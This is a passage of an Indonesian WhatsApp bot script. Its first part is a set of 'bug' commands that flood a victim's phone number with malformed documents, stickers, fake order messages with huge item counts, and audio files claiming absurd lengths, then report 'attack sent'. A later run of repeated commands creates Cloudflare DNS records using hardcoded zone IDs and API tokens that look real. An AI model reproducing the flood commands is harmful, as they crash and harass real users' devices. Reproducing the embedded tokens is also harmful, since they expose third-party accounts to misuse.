Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE RAFATHAR OFFCIAL`", fileName: `Rafathar Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb SanZxyz1 Offcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@SanZxyz1", 
"sourceUrl": "https://youtube.com/@SanZxyz1" }}}, { quoted: m })
}
break
case "killyou": case "doblekill": case "triplekill":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "Rafathar Bug🔥", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "Rafathar Bug🔥", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb SanZxyz1 Offcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@SanZxyz1", 
"sourceUrl": "https://youtube.com/@SanZxyz1" }}}, { quoted: m })
}
break
case "savage": case "santet": case "danger":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(prrkek, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube ZiroMD`",
"message": `${button}`,
"sellerJid": "6283183432282@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: prrkek, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb SanZxyz1 Offcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtu.be/ZlabLFVCFms", 
"sourceUrl": "https://youtu.be/ZlabLFVCFms" }}}, { quoted: m })
}
break
case "meninggal": case "headshot": case "mati":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Rafathar Offcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtu.be/ZlabLFVCFms", 
"sourceUrl": "https://youtu.be/ZlabLFVCFms" }}}, { quoted: m })
}
break
 case 'domain1': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80bb373d8fbd32d5e9eb5c173d7958cf";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain2': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "75743078ed2f835ede897fc2187122bd";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.net";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain2 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain3': {
   if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})        
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b2dab95fa93b9957f47ef84e1bc9558f";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain4': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})       
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "26b6ce099dc3d48e0b491a294786c68b";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
break
 case 'domain5': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba23ecc16636dce6d78e8d11c6c36bd7";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.art";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain6': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba23ecc16636dce6d78e8d11c6c36bd7";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellkuu.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'domain7': {
 if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "ab732313828957ac4dfa9dd05ecdbea4";
    let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
    let tld = "jasa-panel.my.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain8': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b263ae8b1bb47329a24aa3898de4f0b4";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "didinsec.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain9': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a8fda718f07621d32f906f1cc9938358";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain10': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283154501243")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d41a17e101c0f89f0aec609c31137f91";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "sellerpannel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By AZZAM STORE_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain11': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d877d9cf996ac8a1b371851e733ba20e";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelku.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
